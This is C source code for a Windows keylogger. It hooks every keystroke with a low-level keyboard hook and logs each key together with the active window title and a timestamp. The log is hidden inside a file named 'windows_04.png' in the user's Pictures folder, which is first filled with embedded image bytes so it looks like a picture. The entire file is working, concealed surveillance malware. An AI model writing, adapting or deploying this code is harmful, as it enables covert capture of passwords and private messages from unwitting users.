#include "Keylogger.h"


extern size_t file_size;
extern unsigned char file_bytes[];

/*
*	This variable will store HANDLE to the hook for
*	key logging.
*/
HHOOK hhook_;

/*
*	This struct contains the data received by the hook callback. As you see in the callback function
*	it contains the thing you will need: vkCode = virtual key code.
*/
KBDLLHOOKSTRUCT kbdStruct;

FILE *output_file;


static TCHAR lastwindow[256];


// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			if (kbdStruct.vkCode != 0)
				save_key_to_file(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(hhook_, nCode, wParam, lParam);
}


void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(hhook_ = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		//_tprintf(TEXT("[-] Error setting hook for keyboard low level, error: 0x%X"), GetLastError());
	}
}


void ReleaseHook()
{
	UnhookWindowsHookEx(hhook_);
}


int save_key_to_file(int key_stroke)
{
	TCHAR lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		TCHAR window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (_tcscmp(window_title, lastwindow) != 0) {
			_tcscpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			TCHAR s[64];
			_tcsftime(s, sizeof(s), TEXT("%c"), tm);

			_ftprintf(output_file, TEXT("\n\n[Window: %s - at %s]\n"), window_title, s);
			//_tprintf(TEXT("\n\n[Window: %s - at %s] "), window_title, s);
		}
	}

	//_tprintf(TEXT("Key_stroke: 0x%X"), key_stroke);

	if (key_stroke == VK_BACK)
	{
		//_tprintf(TEXT("[BACKSPACE]"));
		_ftprintf(output_file, TEXT("[BACKSPACE]"));
	}
	else if (key_stroke == VK_RETURN)
	{
		//_tprintf(TEXT("[VK_RETURN]"));
		_ftprintf(output_file, TEXT("\n"));
	}
	else if (key_stroke == VK_SPACE)
	{
		//_tprintf(TEXT("[VK_SPACE]"));
		_ftprintf(output_file, TEXT(" "));
	}
	else if (key_stroke == VK_TAB)
	{
		//_tprintf(TEXT("[TAB]"));
		_ftprintf(output_file, TEXT("[TAB]"));
	}
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
	{
		//_tprintf(TEXT("[SHIFT]"));
		_ftprintf(output_file, TEXT("[SHIFT]"));
	}
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
	{
		_tprintf(TEXT("[CONTROL]"));
		_ftprintf(output_file, TEXT("[CONTROL]"));
	}
	else if (key_stroke == VK_ESCAPE)
	{
		//_tprintf(TEXT("[ESCAPE]"));
		_ftprintf(output_file, TEXT("[ESCAPE]"));
	}
	else if (key_stroke == VK_END)
	{
		//_tprintf(TEXT("[END]"));
		_ftprintf(output_file, TEXT("[END]"));
	}
	else if (key_stroke == VK_HOME)
	{
		//_tprintf(TEXT("[HOME]"));
		_ftprintf(output_file, TEXT("[HOME]"));
	}
	else if (key_stroke == VK_LEFT)
	{
		//_tprintf(TEXT("[LEFT]"));
		_ftprintf(output_file, TEXT("[LEFT]"));
	}
	else if (key_stroke == VK_UP)
	{
		//_tprintf(TEXT("[UP]"));
		_ftprintf(output_file, TEXT("[UP]"));
	}
	else if (key_stroke == VK_RIGHT)
	{
		//_tprintf(TEXT("[RIGHT]"));
		_ftprintf(output_file, TEXT("[RIGHT]"));
	}
	else if (key_stroke == VK_DOWN)
	{
		//_tprintf(TEXT("[DOWN]"));
		_ftprintf(output_file, TEXT("[DOWN]"));
	}
	else if (key_stroke == 190 || key_stroke == 110)
	{
		//_tprintf(TEXT("."));
		_ftprintf(output_file, TEXT("."));
	}
	else if (key_stroke == 189 || key_stroke == 109)
	{
		//_tprintf(TEXT("-"));
		_ftprintf(output_file, TEXT("-"));
	}
	else if (key_stroke == 20)
	{
		//_tprintf(TEXT("[CAPSLOCK]"));
		_ftprintf(output_file, TEXT("[CAPSLOCK]"));
	}
	else if (key_stroke >= '0' && key_stroke <= '9')
	{
		TCHAR key;

		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//_tprintf(TEXT("%lc"), key);
		_ftprintf(output_file, TEXT("%lc"), key);
	}
	else {
		TCHAR key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		//_tprintf(TEXT("%lc"), key);
		_ftprintf(output_file, TEXT("%lc"), key);
	}
	//instead of opening and closing file handlers every time, keep file open and flush.
	fflush(output_file);

	return 0;
}


int main()
{
	char path_to_file[MAX_PATH];

	if (SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, 0, (LPSTR)path_to_file) != S_OK)
	{
		//_tprintf(TEXT("Error obtaining pictures path...\n"));
		return -1;
	}

	PathAppendA(path_to_file, "windows_04.png");



	output_file = fopen(path_to_file, "wb");

	if (!output_file)
		return -1;

	for (size_t i = 0; i < file_size; i++)
	{
		fwrite(&file_bytes[i], 1, 1, output_file);
	}

	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessageA(&msg, NULL, 0, 0))
	{
		Sleep(1);
	}
}
